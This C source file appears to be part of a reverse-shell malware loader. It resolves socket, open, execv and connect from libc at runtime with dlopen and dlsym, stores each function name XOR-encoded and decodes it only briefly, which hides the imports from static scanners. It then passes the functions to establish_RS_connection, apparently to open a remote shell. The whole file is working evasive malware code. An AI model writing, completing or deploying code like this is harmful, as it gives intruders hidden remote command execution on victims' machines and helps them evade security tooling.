#include "headers.h"
extern void establish_RS_connection(ghost* );
extern void d_func(unsigned char* , unsigned char , size_t );
void Load_symbols(void)
{
    void* handle = dlopen("libc.so.6", RTLD_LAZY);
    if(!handle)
    {
        goto cleanup;
    }
    ghost dynamic_funcs = {0};
    unsigned char enc_socket_name[] = "\x41\x5d\x51\x59\x57\x46";
    d_func(enc_socket_name , '2' , sizeof(enc_socket_name)-1);
    dynamic_funcs.socket_func = (socket_) dlsym(handle , (char*)enc_socket_name );
    if(!dynamic_funcs.socket_func) 
    {
       goto cleanup; 
    }
    d_func(enc_socket_name , '2' , sizeof(enc_socket_name)-1);

    unsigned char enc_open_name[] = "\x5a\x45\x50\x5b";
    d_func(enc_open_name , '5' , sizeof(enc_open_name)-1);
    dynamic_funcs.open_func = (open_) dlsym(handle , (char*)enc_open_name );
    if(!dynamic_funcs.open_func)
    {
        goto cleanup;
    }
    d_func(enc_open_name , '5' , sizeof(enc_open_name)-1);

    
    unsigned char enc_execv_name[] = "\x5e\x43\x5e\x58\x4d";
    d_func(enc_execv_name , ';' , sizeof(enc_execv_name)-1);
    dynamic_funcs.execv_func = (execv_) dlsym(handle , (char*)enc_execv_name );
    if(!dynamic_funcs.execv_func)
    {
        goto cleanup;
    }
    d_func(enc_execv_name , ';' , sizeof(enc_execv_name)-1);

    unsigned char enc_connect_name[] = "\x0f\x03\x02\x02\x09\x0f\x18";
    d_func(enc_connect_name , 'l' , sizeof(enc_connect_name)-1);
    dynamic_funcs.connect_func = (connect_) dlsym(handle , (char*)enc_connect_name );
    if(!dynamic_funcs.connect_func)
    {
        goto cleanup;
    }
    d_func(enc_connect_name , 'l' , sizeof(enc_connect_name)-1);
    establish_RS_connection(&dynamic_funcs);
    return;
    cleanup:
    exit(EXIT_FAILURE);
    

}
